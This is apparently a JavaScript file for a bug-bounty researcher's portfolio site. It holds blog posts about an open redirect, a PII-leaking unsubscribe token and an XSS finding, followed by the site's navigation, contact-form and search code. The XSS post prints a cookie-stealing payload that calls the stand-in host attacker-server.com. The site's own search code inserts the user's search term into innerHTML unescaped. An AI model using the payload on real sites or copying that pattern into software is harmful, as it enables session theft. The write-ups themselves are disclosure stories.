<h5>Credible Phishing</h5>\n            <p>Users trust links from example.com. The redirect maintains that trust until it's too late.</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">📧</div>\n            <h5>Email Campaigns</h5>\n            <p>Newsletters with tracking links could be replaced with malicious redirects.</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">🔗</div>\n            <h5>Social Engineering</h5>\n            <p>\"Check out this article!\" links could lead anywhere.</p>\n        </div>\n    </div>\n    \n    <h2>Structuring the Report</h2>\n    <p>I've learned that how you present a vulnerability often matters as much as the finding itself. My report included:</p>\n    \n    <ol class=\"styled-list\">\n        <li><strong>Vulnerability Type:</strong> Open Redirect</li>\n        <li><strong>Affected Endpoint:</strong> <code>https://cts.example.com/ct/CT</code></li>\n        <li><strong>Vulnerable Parameter:</strong> <code>url</code></li>\n        <li><strong>Proof of Concept:</strong> Live exploit URL (with disclaimer that it only redirected to a benign test page)</li>\n        <li><strong>Impact Analysis:</strong> Three realistic attack scenarios with increasing severity</li>\n        <li><strong>Remediation Steps:</strong> Whitelist domains, implement validation, or use confirmation pages</li>\n    </ol>\n    \n    <p>For the impact section, I outlined:</p>\n    \n    <div class=\"scenario-box\">\n        <h4>Attack Scenario 1: Basic Phishing</h4>\n        <p>An attacker sends emails pretending to be newsletters from the news site. The links use the open redirect to send users to credential-harvesting pages. Because the link starts with <code>example.com</code>, users are more likely to trust it.</p>\n    </div>\n    \n    <div class=\"scenario-box\">\n        <h4>Attack Scenario 2: Malware Distribution</h4>\n        <p>Articles shared on social media could contain redirects to exploit kits or malware downloads. \"Breaking news\" links are particularly effective for click-through rates.</p>\n    </div>\n    \n    <div class=\"scenario-box\">\n        <h4>Attack Scenario 3: Session Hijacking Enhancement</h4>\n        <p>When combined with other vulnerabilities (like XSS), the redirect could be used to steal session tokens or perform OAuth authorization attacks.</p>\n    </div>\n    \n    <h2>The Response and Resolution</h2>\n    <p>I submitted the report through the platform's bug bounty program. After a couple of days of silence (which is normal for many programs), I received confirmation that the issue was being triaged.</p>\n    \n    <div class=\"timeline\">\n        <h4>Timeline</h4>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 1</div>\n            <div class=\"timeline-content\">\n                <h5>Report Submitted</h5>\n                <p>Full report with PoC and impact analysis delivered</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 3</div>\n            <div class=\"timeline-content\">\n                <h5>Triaged & Validated</h5>\n                <p>Security team confirmed the vulnerability and began working on a fix</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 5</div>\n            <div class=\"timeline-content\">\n                <h5>Fix Deployed</h5>\n                <p>URL validation implemented; only whitelisted domains allowed</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 6</div>\n            <div class=\"timeline-content\">\n                <h5>Bounty Awarded</h5>\n                <p>Reward issued with positive feedback on report quality</p>\n            </div>\n        </div>\n    </div>\n    \n    <p>Within four days of submission, the vulnerability was fixed and the bounty was awarded. The security team implemented proper validation on the <code>url</code> parameter, restricting redirects to trusted, whitelisted domains only.</p>\n    \n    <h2>What Made This Different?</h2>\n    <p>Reflecting on why this experience was positive while my previous one was frustrating, several factors stand out:</p>\n    \n    <div class=\"key-takeaway\">\n        <h3>✅ Success Factors</h3>\n        <ul>\n            <li><strong>Clear Impact Demonstration:</strong> I didn't just show the redirect—I showed <em>how it could be abused</em> in realistic scenarios.</li>\n            <li><strong>Professional Communication:</strong> The report was structured, factual, and focused on helping the team understand and fix the issue.</li>\n            <li><strong>Reasonable Severity Assessment:</strong> I didn't overhype the vulnerability as critical, but presented it as a real risk that needed addressing.</li>\n            <li><strong>Actionable Remediation:</strong> I provided specific, implementable fixes rather than just pointing out the problem.</li>\n        </ul>\n    </div>\n    \n    <p>The security team's response was professional. They acknowledged the report, validated it efficiently, implemented a fix within a reasonable timeframe, and rewarded the finding appropriately.</p>\n    \n    <h2>Key Takeaways for Researchers</h2>\n    <p>1. <strong>Context Matters:</strong> An open redirect on a random blog might be low severity. On a major news site used by millions? That's a different story.</p>\n    <p>2. <strong>Document the Chain:</strong> Show how the vulnerability could be part of a larger attack. Even if you're only reporting one issue, demonstrate its potential in context.</p>\n    <p>3. <strong>Build Credible PoCs:</strong> A realistic proof of concept helps triage teams understand the risk. Keep it ethical and controlled, but make it convincing.</p>\n    <p>4. <strong>Patience with Process:</strong> Good security teams need time to validate, prioritize, and fix. A few days' turnaround is often a sign of proper assessment, not neglect.</p>\n    \n    <p>This experience reinforced that bug bounty hunting isn't just about finding vulnerabilities—it's about communicating risk effectively. When researchers and security teams collaborate well, everyone benefits: the company gets more secure, users stay protected, and researchers get recognized for their work.</p>\n    \n    <p>Sometimes the simplest findings, when presented with clarity and context, lead to the most satisfying resolutions.</p>\n    \n    <p>Stay sharp,<br>Milan</p>\n</div>",
  "tags": ["Bug Bounty", "Open Redirect", "Web Security", "Phishing", "Responsible Disclosure", "Success Story"]
},
  
  {
  "id": 4,
  "title": "Hidden Risks in Unsubscribe Links: A Real Bug Bounty Story",
  "date": "2025-03-22",
  "image": "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=600&fit=crop&crop=center",
  "author": "Milan",
  "excerpt": "A frustrating journey of discovering a PII leak and mass unsubscription flaw in a third-party service, only to have it initially dismissed as 'informative'.",
  "readTime": "7 min read",
  "content": "<div class=\"blog-article\">\n    <div class=\"article-header\">\n        <p class=\"article-lead\">How a simple unsubscription link revealed sensitive user data and a flawed security assessment process.</p>\n    </div>\n    \n    <p>Hello everyone,</p>\n    <p>Today, I'll share a recent bug bounty experience that was both technically interesting and frustrating in its outcome. The target was a popular email sites 😅 (let's call it <strong>example.com</strong>), though due to security and disclosure reasons, I'm hiding the actual domain.</p>\n    \n    <h2>The Reconnaissance</h2>\n    <p>While hunting on a public program last week, I began by enumerating all endpoints and external links used by the main application. Using tools like Burp Suite and custom crawlers, I gathered every URL the site interacted with.</p>\n    \n    <img src=\"https://images.unsplash.com/photo-1627398242454-45a1465c2479?w=1000&auto=format&fit=crop\" alt=\"Burp Suite Interface\" style=\"width:100%; border-radius:8px; margin:20px 0;\">\n    <p class=\"image-caption\">Using Burp Suite to map external endpoints and third-party services.</p>\n    \n    <p>One URL stood out—it pointed to a third-party service used by <strong>example.com</strong> for mailing purposes. The endpoint looked like this:</p>\n    \n    <pre><code class=\"language-http\">http://target.com/u{token}</code></pre>\n    \n    <h2>The Discovery</h2>\n    <p>Out of curiosity, I opened the link. To my surprise, there was <strong>no authentication or authorization</strong> required. The page allowed me to unsubscribe a user with a single click. Even more concerning—I could manipulate the token to unsubscribe <em>any user</em>.</p>\n    \n    <div class=\"info-box\">\n        <h4>⚠️ Immediate Red Flag</h4>\n        <p>An unauthenticated unsubscribe endpoint is a direct path to mass unsubscription attacks, email bombing, and user harassment.</p>\n    </div>\n    \n    <h2>Decoding the Token</h2>\n    <p>The token structure looked familiar—like a base64-encoded string. I decided to decode it:</p>\n    \n    <pre><code class=\"language-javascript\">// Example of decoded token content\n{\n  \"user_id\": \"12345\",\n  \"email\": \"user@example.com\",\n  \"domain\": \"client-domain.com\",\n  \"timestamp\": \"2025-03-15T10:30:00Z\",\n  \"pii_hash\": \"a1b2c3d4e5f6...\",\n  \"full_name\": \"John Doe\"\n}</code></pre>\n    \n    <p>The token wasn't encrypted—it was just <strong>encoded and compressed user data</strong>. Inside, I found:</p>\n    <ul class=\"styled-list\">\n        <li><strong>PII Information:</strong> Email, user ID, sometimes full name</li>\n        <li><strong>Timestamps:</strong> Subscription and expiration dates</li>\n        <li><strong>Hashes:</strong> Internal identifiers</li>\n        <li><strong>Domain Details:</strong> Source of the subscription</li>\n    </ul>\n    \n    <div class=\"impact-grid\">\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">📧</div>\n            <h5>Email Exposure</h5>\n            <p>Personal email addresses accessible via token decode</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">🕵️</div>\n            <h5>PII Leak</h5>\n            <p>User identifiers and metadata exposed without encryption</p>\n        </div>\n        <div class=\"impact-item\">\n            <div class=\"impact-icon\">⚡</div>\n            <h5>Mass Unsubscription</h5>\n            <p>Ability to unsubscribe any user without verification</p>\n        </div>\n    </div>\n    \n    <h2>The Reporting Struggle</h2>\n    <p>Recognizing the severity, I checked if the affected third-party service had a public bug bounty program. They didn't. So, I emailed their security team directly with a detailed report.</p>\n    \n    <p>To their credit, they responded quickly and added me to a <strong>private program on HackerOne</strong>. I submitted the full report with:</p>\n    <ol>\n        <li>Vulnerability description and attack scenario</li>\n        <li>Proof-of-concept with decoded token samples (sanitized)</li>\n        <li>Impact on user privacy and service integrity</li>\n        <li>Remediation recommendations</li>\n    </ol>\n    \n    <div class=\"timeline\">\n        <h4>Timeline of Events</h4>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 1</div>\n            <div class=\"timeline-content\">\n                <h5>Discovery & Initial Contact</h5>\n                <p>Found the vulnerability, emailed security team</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 2</div>\n            <div class=\"timeline-content\">\n                <h5>Invited to Private Program</h5>\n                <p>Added to HackerOne private program, report submitted</p>\n            </div>\n        </div>\n        <div class=\"timeline-item\">\n            <div class=\"timeline-date\">Day 6</div>\n            <div class=\"timeline-content\">\n                <h5>Triaged as Informative</h5>\n                <p>Marked as low severity because \"we can't modify the token\"</p>\n            </div>\n        </div>\n    </div>\n    \n    <h2>The Frustrating Outcome</h2>\n    <p>Four days later, the team triaged the report and marked it as <strong>Informative</strong>.</p>\n    \n    <p>Their reasoning? <em>\"We can't modify the token.\"</em></p>\n    \n    <div class=\"info-box warning\">\n        <h4>🚨 Flawed Assessment</h4>\n        <p>This missed the point entirely. The issue wasn't about modifying the token—it was about:</p>\n        <ul>\n            <li>PII exposure through token decoding</li>\n            <li>Lack of authentication on unsubscribe actions</li>\n            <li>Predictable token structure enabling mass unsubscription</li>\n        </ul>\n    </div>\n    \n    <p><strong>F*CK!!</strong></p>\n    \n    <p>This dismissal highlights a common issue in bug bounty programs: focusing on exploit complexity over actual impact. An attacker doesn't need to modify the token—they can:</p>\n    <ul>\n        <li>Collect tokens from phishing campaigns</li>\n        <li>Use token reuse patterns to unsubscribe users en masse</li>\n        <li>Decode tokens to harvest PII for further attacks</li>\n    </ul>\n    \n    <h2>Key Takeaways</h2>\n    <div class=\"key-takeaway\">\n        <h3>📚 Lessons Learned</h3>\n        <ul>\n            <li><strong>Third-party services are part of your attack surface.</strong> Don't ignore external dependencies.</li>\n            <li><strong>Encryption ≠ Encoding.</strong> Base64 is not a security measure.</li>\n            <li><strong>Impact over complexity.</strong> A simple vulnerability can have severe consequences.</li>\n            <li><strong>Persistence pays.</strong> Even if a report is mishandled, document everything for future appeals or disclosures.</li>\n        </ul>\n    </div>\n    \n    <p>In the end, this was a classic case of a company underestimating a vulnerability because it seemed \"simple.\" But in security, simplicity often means scalability—and scalable attacks are the most dangerous.</p>\n    \n    <p>Stay curious, stay thorough, and don't let \"informative\" labels discourage you from digging deeper.</p>\n    \n    <p>Happy hunting,<br>Milan</p>\n</div>",
  "tags": ["Bug Bounty", "PII Leak", "Token Security", "Third-party Risk", "Informative Frustration"]
},
      {
            "id": 1,
            "title": "How I Found and Exploited an XSS Vulnerability in a Fortune 500 Company",
            "date": "2025-03-15",
            "image": "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "A detailed walkthrough of discovering a persistent XSS vulnerability through improper input sanitization and achieving remote code execution...",
            "readTime": "8 min read",
            "content": `
                <div class="blog-article">
                    <div class="article-header">
                        <p class="article-lead">Discover how a simple search parameter turned into a critical security vulnerability affecting thousands of users.</p>
                    </div>
                    
                    <p>In this detailed write-up, I'll walk you through my process of discovering a critical Cross-Site Scripting (XSS) vulnerability in a Fortune 500 company's web application and how I responsibly disclosed it through their bug bounty program.</p>
                    
                    <h2>The Target</h2>
                    <p>The target was a customer portal for a major financial services company. The application appeared well-secured at first glance, with proper authentication mechanisms and apparent input validation. However, as we'll see, appearances can be deceiving.</p>
                    
                    <div class="info-box">
                        <h4>💡 Key Insight</h4>
                        <p>Never assume security based on surface-level appearance. Always test thoroughly.</p>
                    </div>
                    
                    <h2>Reconnaissance Phase</h2>
                    <p>I began with standard reconnaissance techniques:</p>
                    
                    <ul class="styled-list">
                        <li><strong>Application Mapping:</strong> Using Burp Suite to understand the application structure</li>
                        <li><strong>Input Points:</strong> Identifying all user input points including forms, URL parameters, and headers</li>
                        <li><strong>Automated Testing:</strong> Running initial scans with OWASP ZAP and custom scripts</li>
                    </ul>
                    
                    <h2>The Discovery</h2>
                    <p>While testing the search functionality, I noticed that search terms were reflected in the page without proper encoding. A simple test payload confirmed the vulnerability:</p>
                    
                    <pre><code class="language-javascript">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
                    
                    <p>To my surprise, this executed successfully, confirming the presence of an XSS vulnerability.</p>
                    
                    <h2>Exploitation</h2>
                    <p>I developed a proof-of-concept that demonstrated the severity of this issue:</p>
                    
                    <pre><code class="language-javascript">// Proof of Concept - Stealing Session Cookies
&lt;script&gt;
var img = new Image();
img.src = "https://attacker-server.com/steal?cookie=" + encodeURIComponent(document.cookie);
&lt;/script&gt;</code></pre>
                    
                    <div class="code-explanation">
                        <h5>Code Explanation:</h5>
                        <p>This payload creates an image element that sends the user's session cookie to an attacker-controlled server when executed.</p>
                    </div>
                    
                    <h2>Impact Assessment</h2>
                    <p>This vulnerability could allow an attacker to:</p>
                    
                    <div class="impact-grid">
                        <div class="impact-item">
                            <div class="impact-icon">🔓</div>
                            <h5>Session Hijacking</h5>
                            <p>Steal user session cookies and impersonate legitimate users</p>
                        </div>
                        <div class="impact-item">
                            <div class="impact-icon">⚡</div>
                            <h5>Account Takeover</h5>
                            <p>Perform actions on behalf of authenticated users</p>
                        </div>
                        <div class="impact-item">
                            <div class="impact-icon">💳</div>
                            <h5>Data Exposure</h5>
                            <p>Access sensitive financial information and transaction history</p>
                        </div>
                    </div>
                    
                    <h2>Responsible Disclosure Process</h2>
                    <p>I immediately reported this finding through the company's bug bounty program, providing:</p>
                    
                    <ol>
                        <li>Detailed vulnerability description with CVSS score</li>
                        <li>Step-by-step reproduction guide with screenshots</li>
                        <li>Proof-of-concept code demonstrating the exploit</li>
                        <li>Potential impact analysis and risk assessment</li>
                        <li>Recommended remediation steps</li>
                    </ol>
                    
                    <div class="timeline">
                        <h4>Timeline of Disclosure</h4>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 1</div>
                            <div class="timeline-content">
                                <h5>Initial Report</h5>
                                <p>Submitted detailed vulnerability report</p>
                            </div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 2</div>
                            <div class="timeline-content">
                                <h5>Triaged</h5>
                                <p>Security team confirmed the issue and assigned P1 priority</p>
                            </div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 7</div>
                            <div class="timeline-content">
                                <h5>Resolved</h5>
                                <p>Vulnerability fixed with proper input sanitization</p>
                            </div>
                        </div>
                    </div>
                    
                    <h2>Resolution</h2>
                    <p>The company's security team responded within 24 hours, confirmed the issue, and implemented proper input sanitization. The vulnerability was fixed within one week, and I received a bounty for my findings.</p>
                    
                    <div class="key-takeaway">
                        <h3>📚 Key Takeaway</h3>
                        <p>Never underestimate the importance of proper input validation and output encoding, even in seemingly minor application features. A single unvalidated parameter can compromise an entire application's security.</p>
                    </div>
                </div>
            `,
            "tags": ["XSS", "Bug Bounty", "Web Security", "Vulnerability", "Penetration Testing"]
        },
        {
            "id": 2,
            "title": "A Beginner's Guide to Web Application Penetration Testing Methodology",
            "date": "2025-03-08", 
            "image": "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "Learn the systematic approach to web application penetration testing, from reconnaissance to reporting, with practical examples and tools...",
            "readTime": "12 min read",
            "content": `<div class="blog-article">Professional penetration testing content would go here...</div>`,
            "tags": ["Penetration Testing", "Methodology", "Web Security", "Beginners Guide"]
        },
        {
            "id": 3,
            "title": "Top 5 Custom Security Tools Every Bug Hunter Should Have in Their Arsenal",
            "date": "2025-03-01",
            "image": "https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "Discover the essential custom tools and scripts that can significantly improve your efficiency in finding and exploiting security vulnerabilities...",
            "readTime": "10 min read",
            "content": `<div class="blog-article">Security tools content would go here...</div>`,
            "tags": ["Security Tools", "Automation", "Bug Hunting", "Custom Scripts"]
        }
      
    ]
};

// Global variables for blog system
let currentView = 'latest';
let currentSearchTerm = '';

// ============================================
// SHARE FUNCTIONALITY - FIXED LINK GENERATION
// ============================================

function createShareUrl(blogId) {
    // Get the current page URL without any parameters
    const baseUrl = window.location.origin + window.location.pathname;
    // Create a direct link that goes to blog section with the specific blog
    return `${baseUrl}#blog?post=${blogId}`;
}

function addShareButton(blog) {
    return `
        <div class="blog-share-wrapper">
            <button class="share-link-btn" onclick="copyBlogLink(${blog.id})" title="Copy link to share">
                <i class="bi bi-link-45deg"></i>
                <span>Copy Link</span>
            </button>
            <span class="share-feedback" id="share-feedback-${blog.id}"></span>
        </div>
    `;
}

function copyBlogLink(blogId) {
    const shareUrl = createShareUrl(blogId);
    
    // Create temporary input element
    const tempInput = document.createElement('input');
    tempInput.value = shareUrl;
    document.body.appendChild(tempInput);
    tempInput.select();
    tempInput.setSelectionRange(0, 99999);
    
    try {
        // Try Clipboard API first
        navigator.clipboard.writeText(shareUrl).then(() => {
            showCopyFeedback(blogId);
        }).catch(() => {
            // Fallback for older browsers
            document.execCommand('copy');
            showCopyFeedback(blogId);
        });
    } catch (err) {
        // Final fallback
        document.execCommand('copy');
        showCopyFeedback(blogId);
    }
    
    // Clean up
    document.body.removeChild(tempInput);
}

function showCopyFeedback(blogId) {
    const feedbackEl = document.getElementById(`share-feedback-${blogId}`);
    if (feedbackEl) {
        feedbackEl.textContent = "✓ Link copied!";
        feedbackEl.style.opacity = "1";
        
        setTimeout(() => {
            feedbackEl.style.opacity = "0";
            setTimeout(() => {
                feedbackEl.textContent = "";
            }, 300);
        }, 2000);
    }
}

// Make function available globally
window.copyBlogLink = copyBlogLink;

// ============================================
// URL HANDLING FOR DIRECT BLOG LINKS
// ============================================

function handleDirectBlogLink() {
    // Check if URL has blog parameter
    const hash = window.location.hash;
    if (hash) {
        const match = hash.match(/#blog\?post=(\d+)/);
        if (match) {
            const blogId = parseInt(match[1]);
            const blog = blogData.blogs.find(b => b.id === blogId);
            if (blog) {
                // Scroll to blog section first
                const blogSection = document.getElementById('blog');
                if (blogSection) {
                    blogSection.scrollIntoView({ behavior: 'smooth' });
                }
                
                // Open the blog modal after a short delay
                setTimeout(() => {
                    openBlogModal(blogId);
                }, 800);
            }
        }
    }
}

// ============================================
// MAIN INITIALIZATION
// ============================================

document.addEventListener("DOMContentLoaded", () => {
    // Initialize AOS
    AOS.init({
        duration: 1000,
        once: true,
        offset: 100
    });

    // Initialize all components
    initNavbar();
    initScrollEffects();
    initContactForm();
    initBlogSystem();
    initStatisticsCounter();
    initOWASPTooltips();
    
    // Handle direct blog links
    handleDirectBlogLink();
});

// ============================================
// NAVBAR FUNCTIONALITY
// ============================================

function initNavbar() {
    const navbarLinks = document.querySelectorAll(".nav-link");
    const navbarCollapse = document.querySelector(".navbar-collapse");
    const navbarToggler = document.querySelector(".navbar-toggler");
    const navbar = document.querySelector(".navbar");

    navbarLinks.forEach(link => {
        link.addEventListener("click", () => {
            if (navbarCollapse.classList.contains("show")) {
                navbarToggler.click();
            }
        });
    });

    document.addEventListener('click', (e) => {
        if (navbarCollapse.classList.contains('show') && !navbar.contains(e.target)) {
            navbarToggler.click();
        }
    });

    window.addEventListener("scroll", () => {
        if (window.scrollY > 50) {
            navbar.classList.add("scrolled");
        } else {
            navbar.classList.remove("scrolled");
        }
    });
}

// ============================================
// SCROLL EFFECTS
// ============================================

function initScrollEffects() {
    const backToTop = document.querySelector(".back-to-top");

    window.addEventListener("scroll", () => {
        if (window.scrollY > 100) {
            backToTop.style.display = "block";
        } else {
            backToTop.style.display = "none";
        }
    });

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            
            if (href === '#') return;
            
            e.preventDefault();
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// ============================================
// OWASP TOOLTIPS
// ============================================

function initOWASPTooltips() {
    const badges = document.querySelectorAll('.owasp-badge');
    
    badges.forEach(badge => {
        badge.addEventListener('mouseenter', function() {
            const tooltip = this.getAttribute('data-tooltip');
            this.setAttribute('title', tooltip);
        });
        
        badge.addEventListener('mouseleave', function() {
            this.removeAttribute('title');
        });
    });
}

// ============================================
// STATISTICS COUNTER
// ============================================

        function initStatisticsCounter() {
            const statNumbers = document.querySelectorAll('.stat-number[data-count]');
            
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        animateCounter(entry.target);
                        observer.unobserve(entry.target);
                    }
                });
            }, { 
                threshold: 0.3,
                rootMargin: '0px 0px -100px 0px'
            });
            
            statNumbers.forEach(counter => observer.observe(counter));
        }

        function animateCounter(counter) {
            const target = parseInt(counter.getAttribute('data-count'));
            const suffix = counter.getAttribute('data-suffix') || '';
            
            if (isNaN(target)) {
                counter.style.opacity = '1';
                return;
            }
            
            const duration = 1500;
            const startTime = Date.now();
            
            const updateCounter = () => {
                const elapsed = Date.now() - startTime;
                const progress = Math.min(elapsed / duration, 1);
                
                // Smooth easing
                const easeOutQuart = t => 1 - Math.pow(1 - t, 4);
                const easedProgress = easeOutQuart(progress);
                
                const currentValue = Math.floor(easedProgress * target);
                
                // Display the number with suffix
                counter.textContent = currentValue + suffix;
                counter.style.opacity = 0.3 + (easedProgress * 0.7);
                
                if (progress < 1) {
                    requestAnimationFrame(updateCounter);
                } else {
                    // Final display with suffix
                    counter.textContent = target + suffix;
                    counter.style.opacity = '1';
                }
            };
            
            updateCounter();
        }

        // Initialize everything
        document.addEventListener('DOMContentLoaded', function() {
            initStatisticsCounter();
            
            // Add smooth entrance animations
            const animateElements = (elements, delay = 100) => {
                elements.forEach((el, index) => {
                    el.style.opacity = '0';
                    el.style.transform = 'translateY(20px)';
                    el.style.transition = 'opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1)';
                    
                    setTimeout(() => {
                        el.style.opacity = '1';
                        el.style.transform = 'translateY(0)';
                    }, index * delay);
                });
            };
            
            // Animate stat items
            const statItems = document.querySelectorAll('.stat-item');
            animateElements(statItems, 150);
            
            // Animate platform cards with Intersection Observer
            const cards = document.querySelectorAll('.platform-card');
            const cardObserver = new IntersectionObserver((entries) => {
                entries.forEach((entry, index) => {
                    if (entry.isIntersecting) {
                        setTimeout(() => {
                            entry.target.style.opacity = '1';
                            entry.target.style.transform = 'translateY(0)';
                        }, index * 200);
                    }
                });
            }, { threshold: 0.1 });
            
            cards.forEach(card => {
                card.style.opacity = '0';
                card.style.transform = 'translateY(30px)';
                card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                cardObserver.observe(card);
            });
            
            // Add hover effect for platform cards
            cards.forEach(card => {
                card.addEventListener('mouseenter', function() {
                    this.style.transition = 'all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1)';
                });
                
                card.addEventListener('mouseleave', function() {
                    this.style.transition = 'all 0.4s cubic-bezier(0.4, 0, 0.2, 1)';
                });
            });
        });

// ============================================
// CONTACT FORM WITH EMAILJS - WORKING VERSION
// ============================================

function initContactForm() {
    const contactForm = document.getElementById("contactForm");
    const successPopup = document.getElementById("successPopup");
    const closePopup = document.getElementById("closePopup");

    // Your EmailJS credentials
    const EMAILJS_CONFIG = {
        PUBLIC_KEY: "2X9gef2Tudenoiugp",
        SERVICE_ID: "service_85d3r1y",
        TEMPLATE_ID: "template_ogzw9jc"
    };

    // Initialize EmailJS
    emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);

    if (contactForm) {
        contactForm.addEventListener("submit", function(e) {
            e.preventDefault();
            
            // Get form data - EXACT variable names as in your template
            const templateParams = {
                name: document.getElementById("name").value.trim(),
                email: document.getElementById("email").value.trim(),
                subject: document.getElementById("subject").value.trim(),
                message: document.getElementById("message").value.trim(),
                date: new Date().toLocaleDateString('en-US', { 
                    weekday: 'long', 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit'
                }),
                page_url: window.location.href
            };
            
            // Validate
            if (!templateParams.name || !templateParams.email || !templateParams.subject || !templateParams.message) {
                alert("Please fill in all fields.");
                return;
            }
            
            // Show loading state
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = 'Sending...';
            submitBtn.disabled = true;
            
            console.log("Sending email with params:", templateParams);
            
            // Send email using EmailJS
            emailjs.send(
                EMAILJS_CONFIG.SERVICE_ID,
                EMAILJS_CONFIG.TEMPLATE_ID,
                templateParams
            )
            .then(function(response) {
                console.log('✅ SUCCESS!', response.status, response.text);
                successPopup.classList.add("active");
                contactForm.reset();
            })
            .catch(function(error) {
                console.error('❌ ERROR:', error);
                
                // Show detailed error
                let errorMsg = "Failed to send message. ";
                
                if (error.status === 0) {
                    errorMsg += "Check your internet connection.";
                } else if (error.status === 400) {
                    errorMsg += "Template variables don't match.";
                } else if (error.status === 401) {
                    errorMsg += "Invalid Public Key.";
                } else if (error.status === 404) {
                    errorMsg += "Service or Template not found.";
                } else {
                    errorMsg += `Error code: ${error.status}`;
                }
                
                alert(errorMsg + "\n\nEmail me directly at: gautammilan2024@gmail.com");
            })
            .finally(function() {
                // Reset button
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            });
        });
    }

    // Close popup functionality
    if (closePopup) {
        closePopup.addEventListener("click", () => {
            successPopup.classList.remove("active");
        });
    }

    // Close popup when clicking outside
    window.addEventListener("click", (e) => {
        if (e.target === successPopup) {
            successPopup.classList.remove("active");
        }
    });
    
    // Test connection on page load
    testEmailJSConnection();
}

// Test EmailJS connection
function testEmailJSConnection() {
    console.log("Testing EmailJS connection...");
    console.log("Public Key:", "2X9gef2Tudenoiugp");
    console.log("Service ID:", "service_85d3r1y");
    console.log("Template ID:", "template_ogzw9jc");
    
    // Small test to verify connection
    setTimeout(() => {
        emailjs.init("2X9gef2Tudenoiugp");
        console.log("✅ EmailJS initialized successfully");
    }, 1000);
}

// ============================================
// BLOG SYSTEM
// ============================================

function initBlogSystem() {
    loadBlogs();
    
    document.getElementById('search-button').addEventListener('click', handleSearch);
    document.getElementById('clear-button').addEventListener('click', clearSearch);
    document.getElementById('view-all-btn').addEventListener('click', viewAllBlogs);
    document.getElementById('back-to-latest').addEventListener('click', backToLatest);
    
    const searchInput = document.getElementById('blog-search');
    if (searchInput) {
        searchInput.addEventListener('input', handleSearch);
    }
}

function getLatestBlogs() {
    return blogData.blogs
        .sort((a, b) => new Date(b.date) - new Date(a.date))
        .slice(0, 4);
}

function loadBlogs() {
    const blogContainer = document.getElementById('blog-container');
    const searchResultsInfo = document.getElementById('search-results-info');
    const noResultsMessage = document.getElementById('no-results-message');
    const viewAllButton = document.getElementById('view-all-btn');
    const backToLatestButton = document.getElementById('back-to-latest');
    const showingCount = document.getElementById('showing-count');
    const totalCount = document.getElementById('total-count');
    
    if (!blogContainer) return;

    blogContainer.innerHTML = '';
    
    let blogsToShow = [];
    
    if (currentView === 'latest') {
        blogsToShow = getLatestBlogs();
        if (searchResultsInfo) searchResultsInfo.style.display = 'none';
        if (viewAllButton) viewAllButton.style.display = 'inline-block';
        if (backToLatestButton) backToLatestButton.style.display = 'none';
    } 
    else if (currentView === 'all') {
        blogsToShow = blogData.blogs.sort((a, b) => new Date(b.date) - new Date(a.date));
        if (searchResultsInfo) searchResultsInfo.style.display = 'none';
        if (viewAllButton) viewAllButton.style.display = 'none';
        if (backToLatestButton) backToLatestButton.style.display = 'inline-block';
    }
    else if (currentView === 'search') {
        blogsToShow = searchBlogs(currentSearchTerm);
        if (searchResultsInfo) {
            searchResultsInfo.style.display = 'block';
            searchResultsInfo.innerHTML = `Found ${blogsToShow.length} results for "${currentSearchTerm}"`;
        }
        if (viewAllButton) viewAllButton.style.display = 'none';
        if (backToLatestButton) backToLatestButton.style.display = 'inline-block';
    }
    
    if (noResultsMessage) {
        noResultsMessage.style.display = blogsToShow.length === 0 ? 'block' : 'none';
    }
    
    if (showingCount) showingCount.textContent = blogsToShow.length;
    if (totalCount) totalCount.textContent = blogData.blogs.length;
    
    blogsToShow.forEach(blog => {
        const formattedDate = formatDate(blog.date);
        
        const blogHTML = `
            <div class="col-md-6 col-lg-4" data-aos="fade-up">
                <article class="blog-card">
                    <div class="blog-card-image">
                        <img src="${blog.image}" alt="${blog.title}">
                    </div>
                    
                    <div class="blog-card-content">
                        <div class="blog-meta">
                            <span class="blog-author">By ${blog.author}</span>
                            <span class="blog-date">${formattedDate}</span>
                        </div>
                        
                        <h3 class="blog-title">${blog.title}</h3>
                        <p class="blog-excerpt">${blog.excerpt}</p>
                        
                        <div class="blog-reading-info">
                            <span class="read-time">${blog.readTime}</span>
                        </div>
                        
                        <div class="blog-tags">
                            ${blog.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('')}
                        </div>
